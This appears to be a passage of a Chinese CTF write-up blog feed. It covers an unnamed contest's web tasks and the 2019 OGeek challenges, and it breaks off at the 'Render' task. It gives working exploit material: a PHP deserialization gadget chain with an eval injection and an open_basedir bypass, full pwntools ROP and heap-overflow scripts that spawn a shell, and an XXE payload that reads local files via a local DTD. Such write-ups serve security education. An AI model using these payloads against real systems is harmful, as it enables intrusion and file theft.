        <content type="html"><![CDATA[<h2 id="空相"><a href="#空相" class="headerlink" title="空相"></a>空相</h2><p> 一道签到题，提示参数是id  尝试?id=1为禁止进入2为text  </p><p>?id=1’ or 1=1 绕过  </p><p>给出flag的php文件，提交token得到flag</p><h2 id="八苦"><a href="#八苦" class="headerlink" title="八苦"></a>八苦</h2><p>（三道web题中唯一正常一点的）</p><p>（环境关了，早上做出来的题，记不太清了，记错了也，，2333333）</p><p>进入靶机，发现只有一个welcome，啥也没有。各种备份泄露试一波，最后发现是phps</p><p>然后得到源码（user类当时觉得没用就删了）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">rror_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $careful;</span><br><span class="line">    <span class="keyword">public</span> $securuty = <span class="keyword">array</span>(<span class="string">'say_hello'</span>=&gt;<span class="string">'1'</span>);</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;careful===<span class="number">1</span>)&#123;</span><br><span class="line">            phpinfo();<span class="comment">// step 1:read source,get phpinfo and read it carefullt</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;securuty[$name];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($param1,$param2)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$param1&#125;)&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">'$a='</span>.$_GET[<span class="string">'dangerous'</span>].<span class="string">';'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后根据提示，先去看phpinfo</p><p>构造序列化</p><p><img src="https://i.loli.net/2020/04/30/L8aHUJR5WuMCbdr.png" alt="![](https://i.loli.net/2020/04/30/L8aHUJR5WuMCbdr.png)"></p><p>O:4:”Test”:2:{s:10:” * careful”;i:1;s:8:”securuty”;a:1:{s:9:”say_hello”;s:1:”1”;}}</p><p>因为protected的关系，好像中间有截断，所以urlencode，</p><p>然后传给foo，得到phpinfo</p><p>ctrl f 搜索.php 得到一个 preload.php（具体啥名字忘记了）</p><p>然后得到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Welcome</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say_hello</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"welcome&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Welcome_again</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $willing ;</span><br><span class="line">    <span class="keyword">public</span> $action ;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;action=<span class="keyword">new</span> Welcome;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;willing)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;action-&gt;say_hello();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>类似于强网杯upload</p><p>姿势：</p><p>生成Welcome_again 类，</p><p>willing 赋值 1，action 赋值 new Test（），Test 中 赋值securuty 以键值对  ‘say_hello’=&gt; 1</p><p>利用链：</p><p>首先生成Welcome_again 类，调用__construct()方法赋值action</p><p>然后调用__destruct()方法，（此时$this-&gt;willing=1）</p><p>因为action = new Test()</p><p>所以调用  Test.say_hello()</p><p>但是Test没有该方法，所以调用__call()方法</p><p>然后  if($this-&gt;{$param1})</p><p>又没有改属性，所以调用__get()方法</p><p>返回1（我们之前构造的键值对中的值）</p><p>然后通过判断，</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">'$a='</span>.$_GET[<span class="string">'dangerous'</span>].<span class="string">';'</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>这里利用  ;  截断，</p><p>使得eval执行不止一个函数</p><p>然后翻出之前收藏的读文件一把梭，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1;<span class="variable">$fp</span> = fopen(<span class="string">"./index.php"</span>,<span class="string">"r"</span>);<span class="variable">$str</span> = fread(<span class="variable">$fp</span>,filesize(<span class="string">"./index.php"</span>));<span class="built_in">echo</span> <span class="variable">$str</span> = str_replace(<span class="string">"\r\n"</span>,<span class="string">"&lt;br /&gt;"</span>,<span class="variable">$str</span>);</span><br><span class="line"></span><br><span class="line">1;<span class="built_in">echo</span> readfile(<span class="string">"./index.php"</span>);</span><br></pre></td></tr></table></figure><p>(忘记当时用的哪个了)</p><p>发现成功</p><p>然后去读flag</p><p>发现失败，</p><p>要bypass open_basedir</p><p>参考wp</p><p><a href="https://blog.csdn.net/systemino/article/details/94645518中的" target="_blank" rel="noopener">https://blog.csdn.net/systemino/article/details/94645518中的</a></p><p>尝试构造：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">chdir</span>(<span class="string">'/tmp'</span>);</span><br><span class="line"><span class="selector-tag">mkdir</span>(<span class="string">'sky'</span>);</span><br><span class="line"><span class="selector-tag">chdir</span>(<span class="string">'sky'</span>);</span><br><span class="line"><span class="selector-tag">ini_set</span>(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);</span><br><span class="line"><span class="selector-tag">chdir</span>(<span class="string">'..'</span>);</span><br><span class="line"><span class="selector-tag">chdir</span>(<span class="string">'..'</span>);</span><br><span class="line"><span class="selector-tag">chdir</span>(<span class="string">'..'</span>);</span><br><span class="line"><span class="selector-tag">chdir</span>(<span class="string">'..'</span>);</span><br><span class="line"><span class="selector-tag">ini_set</span>(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);</span><br><span class="line"><span class="selector-tag">echo</span>(file_get_contents(<span class="string">'/var/www/flag.php'</span>));</span><br></pre></td></tr></table></figure><p>得到flag</p><p>最终payload：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">foo=O%3A13%3A%22Welcome_again%22%3A2%3A%7Bs%3A7%3A%22willing%22%3Bi%3A1%3Bs%3A6%3A%22action%22%3BO%3A4%3A%22Test%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00careful%22%3Bi%3A0%3Bs%3A8%3A%22securuty%22%3Ba%3A1%3A%7Bs%3A9%3A%22say_hello%22%3Bs%3A1%3A%221%22%3B%7D%7D%7D</span><br><span class="line">&amp;dangerous=<span class="number">1</span>;<span class="keyword">chdir</span>(<span class="string">'/tmp'</span>);<span class="keyword">mkdir</span>(<span class="string">'sky'</span>);<span class="keyword">chdir</span>(<span class="string">'sky'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);<span class="keyword">chdir</span>(<span class="string">'..'</span>);<span class="keyword">chdir</span>(<span class="string">'..'</span>);<span class="keyword">chdir</span>(<span class="string">'..'</span>);<span class="keyword">chdir</span>(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);echo(file_get_contents(<span class="string">'/var/www/flag.php'</span>));</span><br></pre></td></tr></table></figure><h2 id="六尘"><a href="#六尘" class="headerlink" title="六尘"></a>六尘</h2><p>非预期解</p><p>wwwscan扫描到存在log，</p><p>访问<a href="http://111.33.164.6:10005/log/access.log" target="_blank" rel="noopener">http://111.33.164.6:10005/log/access.log</a></p><p>搜索flag发现<br><img src="https://i.loli.net/2020/04/30/xAfJQ89qsvkcOtr.png" alt="wwwscan"></p><p>似乎是别的解出题目的队伍去拿flag时留下来的流量？（白嫖一手）</p><p>进去加上token即可得到flag</p>]]></content>
      
      
      <categories>
          
          <category> 比赛小屋 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write Up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019 OGeek</title>
      <link href="/2019/08/27/2019OGeek/"/>
      <url>/2019/08/27/2019OGeek/</url>
      
        <content type="html"><![CDATA[<h3 id="catch-fun"><a href="#catch-fun" class="headerlink" title="catch fun"></a>catch fun</h3><p>题目描述：oppo catch fun</p><p>​        提示：oppo’s phone model，flag{} is required</p><p>百度： oppo catch fun</p><p><img src="https://i.loli.net/2020/04/30/xTf45hCVaZrkQGe.png" alt="catch fun"></p><p>根据提示得到flag</p><p>flag{Reno}</p><h3 id="babyrop"><a href="#babyrop" class="headerlink" title="babyrop"></a>babyrop</h3><p>题目描述：From the ground up.</p><p>这道题简单看看，strncmp函数可以绕过，v1即比较的长度可以控制，我们可以随意输入一个数字比如1，然后和随机数比较第一个数字，爆破绕过。接着存在栈溢出可能性的函数的溢出长度最大为0xff，且可以由上一个函数的输入来控制。剩下的就是简单的rop了。</p><p>exp脚本如下：</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/python</span></span><br><span class="line"><span class="meta">#-*- coding:UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'split'</span>, <span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#p = process(<span class="string">"./babyrop"</span>)</span></span><br><span class="line">p = remote(<span class="string">'47.112.137.238'</span>, <span class="number">13337</span>)</span><br><span class="line">elf = ELF(<span class="string">'./babyrop'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line">vuln_addr = <span class="number">0x080487D0</span></span><br><span class="line">p.<span class="built_in">send</span>(<span class="string">'1'</span>+<span class="string">'\x00'</span>*<span class="number">6</span> + <span class="string">'\xff'</span> + <span class="string">'\n'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Correct\n'</span>)</span><br><span class="line"><span class="meta">#gdb.attach(p)</span></span><br><span class="line">p.<span class="built_in">send</span>(<span class="string">'\x00'</span>*<span class="number">0xe7</span> + p32(<span class="number">0xdeadbeaf</span>) + p32(elf.plt[<span class="string">'puts'</span>]) + p32(vuln_addr) + p32(elf.got[<span class="string">'puts'</span>]) + p32(<span class="number">0xffffffff</span>))</span><br><span class="line"></span><br><span class="line">libcbase = u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>, <span class="string">'\x00'</span>)) - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="meta">#libcbase = u32(p.recv(4).ljust(4, <span class="string">'\x00'</span>)) - 0x60ca0</span></span><br><span class="line"><span class="built_in">log</span>.info(<span class="string">'libcbase:%#x'</span> %libcbase)</span><br><span class="line">system_addr = libcbase + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="meta">#system_addr = libcbase + 0x3bda0</span></span><br><span class="line">bin_sh = libcbase + <span class="number">0x15902b</span></span><br><span class="line">p.<span class="built_in">send</span>(<span class="string">'\x00'</span>*<span class="number">0xe7</span> + p32(<span class="number">0xdeadbeaf</span>) + p32(system_addr) + p32(vuln_addr) + p32(bin_sh))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/04/30/Imwa5hQufLGrjTe.png" alt="babyrop"></p><h3 id="book-manager"><a href="#book-manager" class="headerlink" title="book manager"></a>book manager</h3><p>题目描述：Endless book writing.</p><p>简单逆一下，可以很容易找到addtext函数中出现堆溢出，当v7的值小于0x100时，可以往里面写入0x100个字节。于是构造一下堆结构，改写一个text_ptr指向已经释放在unsortedbin中chunk，然后showbook，泄露出libc，然后再利用溢出修改一个text_ptr指向free_hook，改写为system函数地址，然后free一个/bin/sh即可getshell。脚本如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*- coding:UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'split'</span>, <span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process('./bookmanager')</span></span><br><span class="line">p = remote(<span class="string">'47.112.115.30'</span>, <span class="number">13337</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choose</span><span class="params">(choice)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice:'</span>)</span><br><span class="line">    p.sendline(str(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AddChapter</span><span class="params">(chapterName)</span>:</span></span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Chapter name:'</span>)</span><br><span class="line">    p.send(chapterName)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AddSection</span><span class="params">(chapterName, sectionName)</span>:</span></span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Which chapter do you want to add into:'</span>)</span><br><span class="line">    p.send(chapterName)</span><br><span class="line">    sectionAddr = int(p.recvuntil(<span class="string">'\nSection name:'</span>, drop=<span class="literal">True</span>)[<span class="number">2</span>:], <span class="number">16</span>)</span><br><span class="line">    p.send(sectionName)</span><br><span class="line">    <span class="keyword">return</span> sectionAddr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AddText</span><span class="params">(sectionName, size, text)</span>:</span></span><br><span class="line">    choose(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\nWhich section do you want to add into:'</span>)</span><br><span class="line">    p.send(sectionName)</span><br><span class="line">    p.recvuntil(<span class="string">'\nHow many chapters you want to write:'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'\nText:'</span>)</span><br><span class="line">    p.send(text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DelChapter</span><span class="params">(chapterName)</span>:</span></span><br><span class="line">    choose(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\nChapter name:'</span>)</span><br><span class="line">    p.send(chapterName)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DelSection</span><span class="params">(sectionName)</span>:</span></span><br><span class="line">    choose(<span class="number">5</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\nSection name:'</span>)</span><br><span class="line">    p.send(sectionName)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DelText</span><span class="params">(sectionName)</span>:</span></span><br><span class="line">    choose(<span class="number">6</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\nSection name:'</span>)</span><br><span class="line">    p.send(sectionName)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ShowBook</span><span class="params">()</span>:</span></span><br><span class="line">    choose(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Update</span><span class="params">(flag, oldName, newName)</span>:</span></span><br><span class="line">    choose(<span class="number">8</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\nWhat to update?(Chapter/Section/Text):'</span>)</span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">        p.sendline(<span class="string">'Chapter'</span>)</span><br><span class="line">        p.recvuntil(<span class="string">'\nChapter name:'</span>)</span><br><span class="line">        p.send(oldName)</span><br><span class="line">        p.recvuntil(<span class="string">'\nNew Chapter name:'</span>)</span><br><span class="line">        p.send(newName)</span><br><span class="line">    <span class="keyword">elif</span> flag == <span class="number">2</span>:</span><br><span class="line">        p.sendline(<span class="string">'Section'</span>)</span><br><span class="line">        p.recvuntil(<span class="string">'\nSection name:'</span>)</span><br><span class="line">        p.send(oldName)</span><br><span class="line">        p.recvuntil(<span class="string">'\nNew Section name:'</span>)</span><br><span class="line">        p.send(newName)</span><br><span class="line">    <span class="keyword">elif</span> flag == <span class="number">3</span>:</span><br><span class="line">        p.sendline(<span class="string">'Text'</span>)</span><br><span class="line">        p.recvuntil(<span class="string">'\nSection name:'</span>)</span><br><span class="line">        p.send(oldName)</span><br><span class="line">        p.recvuntil(<span class="string">'\nNew Text:'</span>)</span><br><span class="line">        p.send(newName)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Name of the book you want to create: '</span>)</span><br><span class="line">p.sendline(<span class="string">'aaaa'</span>)</span><br><span class="line">AddChapter(<span class="string">'cha1'</span>)</span><br><span class="line">AddSection(<span class="string">'cha1'</span>, <span class="string">'sec1'</span>)</span><br><span class="line">AddText(<span class="string">'sec1'</span>, <span class="number">0x10</span>, <span class="string">'text1'</span>)</span><br><span class="line">AddSection(<span class="string">'cha1'</span>, <span class="string">'sec2'</span>)</span><br><span class="line">AddText(<span class="string">'sec2'</span>, <span class="number">0x100</span>, <span class="string">'text2'</span>)</span><br><span class="line">AddSection(<span class="string">'cha1'</span>, <span class="string">'sec3'</span>)</span><br><span class="line">sec4_addr = AddSection(<span class="string">'cha1'</span>, <span class="string">'sec4'</span>)</span><br><span class="line">text4_addr = sec4_addr + <span class="number">0x40</span></span><br><span class="line">AddText(<span class="string">'sec4'</span>, <span class="number">0x90</span>, <span class="string">'text4'</span>)</span><br><span class="line">AddSection(<span class="string">'cha1'</span>, <span class="string">'sec5'</span>)</span><br><span class="line">AddText(<span class="string">'sec5'</span>, <span class="number">0x20</span>, <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">DelText(<span class="string">'sec4'</span>)</span><br><span class="line">Update(<span class="number">3</span>, <span class="string">'sec1'</span>, <span class="string">'\x00'</span>*<span class="number">0x10</span> + p64(<span class="number">0x0</span>) + p64(<span class="number">0x41</span>) + <span class="string">'sec2'</span>.ljust(<span class="number">0x20</span>, <span class="string">'\x00'</span>) + p64(text4_addr) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x0</span>) + p64(<span class="number">0x111</span>))</span><br><span class="line"></span><br><span class="line">ShowBook()</span><br><span class="line">p.recvuntil(<span class="string">'Section:sec2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'\n      Text:'</span>)</span><br><span class="line">libcbase = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x3c4b78</span> </span><br><span class="line">log.info(<span class="string">'libcbase:%#x'</span> %libcbase)</span><br><span class="line">free_hook = libcbase + <span class="number">0x3C67A8</span></span><br><span class="line">system_addr = libcbase + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">Update(<span class="number">3</span>, <span class="string">'sec1'</span>, <span class="string">'\x00'</span>*<span class="number">0x10</span> + p64(<span class="number">0x0</span>) + p64(<span class="number">0x41</span>) + <span class="string">'sec2'</span>.ljust(<span class="number">0x20</span>, <span class="string">'\x00'</span>) + p64(free_hook) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x0</span>) + p64(<span class="number">0x111</span>))</span><br><span class="line"></span><br><span class="line">Update(<span class="number">3</span>, <span class="string">'sec2'</span>, p64(system_addr))</span><br><span class="line"></span><br><span class="line">DelText(<span class="string">'sec5'</span>)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/04/30/PkQzGawD4UtrIFo.png" alt="book manager"></p><h3 id="Look-Around"><a href="#Look-Around" class="headerlink" title="Look Around"></a>Look Around</h3><p>题目描述：builded from tomcat:8-jre8</p><p>进入靶机，f12一波，发现</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./js/_.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>进入：<a href="http://47.107.253.140:18080/webserver/js/_.js" target="_blank" rel="noopener">http://47.107.253.140:18080/webserver/js/_.js</a></p><p>得到</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var data = "<span class="meta">&lt;?xml version=\"1.0\" ?&gt;</span>\n<span class="tag">&lt;<span class="name">request</span>&gt;</span>\n    <span class="tag">&lt;<span class="name">status</span>&gt;</span>1<span class="tag">&lt;/<span class="name">status</span>&gt;</span>\n<span class="tag">&lt;/<span class="name">request</span>&gt;</span>";</span><br><span class="line"></span><br><span class="line">setInterval(function()&#123;</span><br><span class="line">    $.post("callback", data);</span><br><span class="line">&#125;, 10000);</span><br></pre></td></tr></table></figure><p>猜测是XXE</p><p>于是进入接口callback</p><p><img src="https://i.loli.net/2020/04/30/OrwX4yQTz7GoYA6.png" alt="Look Around"></p><p>要POST，所以抓包，</p><p>然后不久前学XXE时看到过这篇根据本地DTD来实现XXE的文章</p><p><a href="https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation" target="_blank" rel="noopener">https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation</a></p><p>于是想在这里试试。</p><p>但是本地有啥DTD文件呢？发现题目给了提示。于是根据题目描述，下载同名镜像，</p><p>给个docker，然后找其中的dtd文件，发现了一个文章中提到的文件</p><p>/usr/share/xml/fontconfig/fonts.dtd</p><p>于是用文章里的payload 一把梭</p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE message [</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">local_dtd</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">usr</span>/<span class="attr">share</span>/<span class="attr">xml</span>/<span class="attr">fontconfig</span>/<span class="attr">fonts.dtd</span>"&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">expr</span> '<span class="attr">aaa</span>)&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">!ENTITY</span> &amp;#<span class="attr">x25</span>; <span class="attr">file</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">flag</span>"&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">!ENTITY</span> &amp;#<span class="attr">x25</span>; <span class="attr">eval</span> "&lt;!<span class="attr">ENTITY</span> &amp;#<span class="attr">x26</span>;#<span class="attr">x25</span>; <span class="attr">error</span> <span class="attr">SYSTEM</span> &amp;#<span class="attr">x27</span>;<span class="attr">file:</span>///<span class="attr">abcxyz</span>/&amp;#<span class="attr">x25</span>;<span class="attr">file</span>;&amp;#<span class="attr">x27</span>;&gt;</span>"&gt;</span></span><br><span class="line"><span class="xml">        &amp;#x25;eval;</span></span><br><span class="line"><span class="xml">        &amp;#x25;error;</span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">aa</span> (<span class="attr">bb</span>'&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"></span><span class="perl">    %local_dtd;</span><span class="xml"></span></span><br><span class="line"><span class="xml">]&gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">message</span>&gt;</span><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>得到flag</p><p><img src="https://i.loli.net/2020/04/30/CYjDFbEnNcAzvhO.png" alt="Look Around"></p><p>flag{f1c6811d4dce2ae37613cee977febe305f4de8fe}</p><h3 id="Render"><a href="#Render" class="headerlink" title="Render"></a>Render</h3><p>题目描述：Write something you want to 